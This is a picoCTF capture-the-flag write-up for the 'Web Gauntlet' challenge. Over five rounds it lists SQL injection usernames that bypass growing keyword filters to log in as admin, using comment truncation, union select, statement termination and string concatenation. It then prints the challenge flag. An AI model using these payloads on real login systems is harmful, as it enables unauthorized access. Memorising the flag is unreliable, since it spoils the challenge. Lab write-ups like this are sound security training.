# Web Gauntlet
- Tags: Web Exploitation
- Description: Can you beat the filters? Log in as admin.

# Solution
- We have to exploit SQL Injection in this challenge.

```
Round 1
Filter: or
Username: admin' --
Password: 123
Actual Query: SELECT * FROM users WHERE username='admin' -- AND password='123'
```

```
Round 2
Filter: or and = like --
Username: admin' union select * from users where '1
Password: 123
Actual Query: SELECT * FROM users WHERE username='admin' union select * from users where '1' AND password='123'
```

```
Round 3
Filter: or and = like > < --
Username: admin';
Password: 123
Actual Query: SELECT * FROM users WHERE username='admin';' AND password='123'
```

```
Round 4
Filter: or and = like > < -- admin
Username: ad'||'min';
Password: 123
Actual Query: SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
```

```
Round 5
Filter: or and = like > < -- union admin
Username: ad'||'min';
Password: 123
Actual Query: SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
```

- After completing all of the rounds, you can now visit second link, and go to the bottom, where you will find the flag.

```
picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}
```
